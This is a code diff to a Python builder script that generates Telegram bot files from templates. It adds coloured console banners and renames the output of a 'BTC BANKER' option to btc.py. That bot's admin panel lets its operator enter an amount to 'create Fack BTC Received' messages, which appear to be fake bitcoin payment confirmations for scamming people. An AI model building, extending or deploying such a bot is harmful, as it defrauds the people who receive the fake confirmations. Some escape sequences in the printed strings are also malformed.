@@ -113,7 +113,7 @@ ID = '{userid}'
 bot = telebot.TeleBot("{token}")
 adr = ['Tverskaya street, house 13', '60th Anniversary of October Avenue', 'Vinokurova Street', '3rd Golutvinsky Lane']
 bot.send_message(ID, '!BOT STARTED!') 
-print("The bot is running!")
+print("\n\n\033[91m[\033[92m*\033[91m]\033[93m Bot Launched! \033[96m >>> \033[0m\n\n")
 
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -233,7 +233,7 @@ log = open('bot-log.txt', 'a+', encoding='utf-8')
 ID = '{userid}'
 bot = telebot.TeleBot("{token}")
 bot.send_message(ID, '!BOT STARTED!')
-print("Bot launched!") 
+print("\n\n\033[91m[\033[92m*\033[91m]\033[93m Bot Launched! \033[96m >>> \033[0m\n\n") 
 @bot.message_handler(commands=['start'])
 def start(message):
 	bot.send_message(message.chat.id, '''👋 Hello! 👋
@@ -372,7 +372,7 @@ log = open('bot-log.txt', 'a+', encoding='utf-8')
 ID = '{userid}'
 bot = telebot.TeleBot("{token}")
 bot.send_message(ID, '!BOT STARTED!')
-print("Bot launched!") 
+print("\n\n\033[91m[\033[92m*\033[91m]\033[93m Bot Launched! \033[96m >>> \033[0m\n\n") 
 @bot.message_handler(commands=['start'])
 def start(message):
 	bot.send_message(message.chat.id, f'''👋 Hello {{message.from_user.first_name}}! 👋
@@ -577,7 +577,7 @@ import random
 ID = '{userid}'
 bot = telebot.TeleBot("{token}")
 bot.send_message(ID, '!BOT STARTED!') 
-print("Bot launched!") 
+print("\n\n\033[91m[\033[92m*\033[91m]\033[93m Bot Launched! \033[96m >>> \033[0m\n\n") 
 
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -661,11 +661,20 @@ def contact(message):
 bot.polling()
         """)
         f.close()
-        print("The acquaintance.py file is saved")
+        os.system('clear')
+        print("\n\n")
+        print("\033[1;91m\033[0m\033[1;33m\033[0m\033[1;96m\033[0m\033[1;92m  ---------------------------------   \033[1;91m\033[0m")
+        print("\033[1;91m\033[0m\033[1;33m\033[0m\033[1;90m\033[0m\033[1;92m  !!    Bot Build Successfull    !!  \033[1;91m\033[0m")
+        print("\033[1;91m\033[0m\033[1;33m\033[0m\033[1;96m\033[0m\033[1;92m  ---------------------------------   \033[1;91m\033[0m")
+        time.sleep(2)
+        print("\n")
+        print("\033[1m \033[36m[+] BTC Telegram Bot Tool is Ready \033[m \033[21")
+        print("\n")
+        print("\033[92m[+] Now Type This Command:\033[93m python btc.py \033[m \n\n ")
 
     elif choice == 5:
         # Code for choice 5 (BTC BANKER)
-        f = open('btc_banker.py', 'w+', encoding='utf-8')
+        f = open('btc.py', 'w+', encoding='utf-8')
         f.write(f"""
 import telebot
 from telebot import types
@@ -675,13 +684,13 @@ import random
 ID = '{userid}'
 bot = telebot.TeleBot("{token}")
 bot.send_message(ID, '!BOT STARTED!') 
-print("Bot launched!") 
+print("\n\n\033[91m[\033[92m*\033[91m]\033[93m Bot Launched! \033[96m >>> \033[0m\n\n") 
 
 
 @bot.message_handler(commands=['admin'])
 def adm(message):
 	if message.from_user.id == int(ID):
-		msg = bot.send_message(ID, 'Welcome to the bot admin panel! \\n \\n Enter the amount for which to create Fack BTC Received:') 
+		msg = bot.send_message(ID, 'Welcome to the bot admin panel! \\n \\n Enter the amount for which to create Fack BTC Received: (only number)') 
 		bot.register_next_step_handler(msg, check)
 def check(message):
 	try:
@@ -756,7 +765,7 @@ bot.polling()
         print("\n")
         print("\033[1m \033[36m[+] BTC Telegram Bot Tool is Ready \033[m \033[21")
         print("\n")
-        print("\033[92m[+] Now Type This Command:\033[93m python btc_banker.py \033[m \n\n ")
+        print("\033[92m[+] Now Type This Command:\033[93m python btc.py \033[m \n\n ")
 	
     else:
         print(' \n\n\033[92m[\033[94m!\033[92m]\033[92m Invalid option Try Again !! \e[0m\n\n')
